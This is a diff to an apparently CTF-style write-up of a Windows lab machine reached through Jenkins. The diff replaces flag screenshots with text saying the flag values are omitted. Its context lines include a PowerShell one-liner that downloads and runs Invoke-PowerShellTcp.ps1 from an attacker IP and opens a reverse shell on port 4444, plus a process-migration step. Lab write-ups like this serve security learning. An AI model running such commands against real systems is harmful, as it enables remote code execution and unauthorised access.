@@ -75,9 +75,7 @@ The following payload was placed in the Jenkins batch command box and the job wa
 powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.203.76:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.76 -Port 4444
 ```
 
-A shell was caught as **alfred\bruce**.
-
-<img src="06-user-flag.png" width="800">
+A shell was caught as **alfred\bruce**. *user.txt* was readable from bruce's Desktop; flag value omitted from this writeup.
 
 ---
 
@@ -148,7 +146,7 @@ migrate <PID of services.exe>
 cat "C:/Windows/System32/config/root.txt"
 ```
 
-<img src="08-root-flag.png" width="800">
+The root flag dropped from the SYSTEM shell. Flag value omitted from this writeup.
 
 ---
 
